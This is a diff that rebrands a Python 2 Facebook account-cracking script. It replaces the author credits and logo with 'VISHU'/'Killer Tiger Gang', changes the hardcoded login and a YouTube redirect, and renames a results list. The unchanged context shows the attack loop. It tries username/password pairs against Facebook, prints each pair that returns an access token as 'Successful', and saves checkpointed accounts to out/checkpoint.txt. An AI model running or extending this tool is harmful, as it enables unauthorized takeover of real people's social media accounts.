@@ -49,17 +49,18 @@ def jalan(z):
 ##### LOGO #####
 logo = """ -----------------------------•◈•
 (  __)\\ ____--------------_------------•◈•
-|__(~)    •||•THE - AAHIL -OFFICAL------•◈•
-|__\~~) •||•RANA - RAJPUT---------------•◈•
-|__(-----\  •◈•------BLACK-TIGER--------•◈•
-|__~~~\ •◈•-----█-------⑦-------█------•◈•
-|__~~~\ •◈•-----█-------⑧-------█------•◈•
-|__~~~\ •◈•-----█-------⑥-------█------•◈•
+|__(~)    •||•TEJAS RAJPUT -OFFICAL------•◈•
+|__\~~) •||•TEJAS - RAJPUT---------------•◈•
+|__(-----\  •◈•KILLER TIGER GANG--------•◈•
+
+██╗░░░██╗██╗░██████╗██╗░░██╗██╗░░░██╗
+██║░░░██║██║██╔════╝██║░░██║██║░░░██║
+╚██╗░██╔╝██║╚█████╗░███████║██║░░░██║
+░╚████╔╝░██║░╚═══██╗██╔══██║██║░░░██║
+░░╚██╔╝░░██║██████╔╝██║░░██║╚██████╔╝
+
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;FlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1; Aahilrna4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Therana/zero
+\033[1;96mAuthor  \033[1;93m: \033[1;92mVISHU
 \033[1;91m======================================="""
 
 def tik():
@@ -80,15 +81,13 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;92mFlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1;92m Aahilrana4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Therana/zero
+\033[1;91m=======================================
+\033[1;96mAuthor  \033[1;93m: \033[1;92mVISHU
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "KTG"
+CorrectPassword = "VISHU"
 
 loop = 'true'
 while (loop == 'true'):
@@ -100,10 +99,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
+            os.system('xdg-open https://www.youtube.com/watch?v=n5WnMJ0J6qA')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
+        os.system('xdg-open https://www.youtube.com/watch?v=n5WnMJ0J6qA')
 
 def login():
 	os.system('clear')
@@ -393,7 +392,7 @@ def pilih_super():
 															q = json.load(data)
 															if 'access_token' in q:
 																print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
-																oks.append(user+pass7)
+																successful.append(user+pass7)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
 																	print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
@@ -410,7 +409,7 @@ def pilih_super():
 	p.map(main, id)
 	print 42*"\033[1;96m="
 	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
-	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
+	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(successful))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 	menu()
